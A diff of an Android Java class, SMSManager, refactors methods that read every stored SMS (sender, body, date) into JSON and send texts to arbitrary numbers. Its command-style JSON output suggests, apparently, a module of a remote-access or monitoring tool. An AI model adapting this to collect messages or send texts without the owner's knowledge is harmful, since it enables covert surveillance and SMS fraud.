@@ -12,6 +12,7 @@ import com.fason.app.core.permissions.PermissionManager;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+// SMS manager for reading and sending messages
 public final class SMSManager {
 
     private static final Uri SMS_URI = Uri.parse("content://sms/");
@@ -19,20 +20,22 @@ public final class SMSManager {
 
     private SMSManager() {}
 
-    public static JSONObject getsms() {
+    // Get SMS list
+    public static JSONObject get() {
         JSONObject result = new JSONObject();
         JSONArray list = new JSONArray();
 
         try {
             result.put("smslist", list);
-            
+
             if (!PermissionManager.canIUse(Manifest.permission.READ_SMS)) {
                 result.put("error", "Permission denied");
                 return result;
             }
 
             Cursor cur = FasonApp.getContext().getContentResolver().query(
-                SMS_URI, new String[]{"address", "body", "date", "read", "type"}, 
+                SMS_URI,
+                new String[]{"address", "body", "date", "read", "type"},
                 null, null, "date DESC");
 
             if (cur != null) {
@@ -61,15 +64,36 @@ public final class SMSManager {
         return result;
     }
 
-    public static boolean sendSMS(String phone, String msg) {
-        if (TextUtils.isEmpty(phone) || TextUtils.isEmpty(msg)) return false;
-        if (!PermissionManager.canIUse(Manifest.permission.SEND_SMS)) return false;
-
+    // Send SMS
+    public static JSONObject send(String phone, String msg) {
+        JSONObject result = new JSONObject();
         try {
-            SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
-            return true;
-        } catch (Exception e) {
-            return false;
-        }
+            result.put("action", "sendSMS");
+
+            if (TextUtils.isEmpty(phone) || TextUtils.isEmpty(msg)) {
+                result.put("error", "Invalid phone or message");
+                return result;
+            }
+
+            if (!PermissionManager.canIUse(Manifest.permission.SEND_SMS)) {
+                result.put("error", "Permission denied");
+                return result;
+            }
+
+            try {
+                SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
+                result.put("success", true);
+                result.put("to", phone);
+            } catch (Exception e) {
+                result.put("error", e.getMessage());
+            }
+        } catch (Exception ignored) {}
+
+        return result;
+    }
+
+    // Legacy method
+    public static JSONObject getsms() {
+        return get();
     }
 }
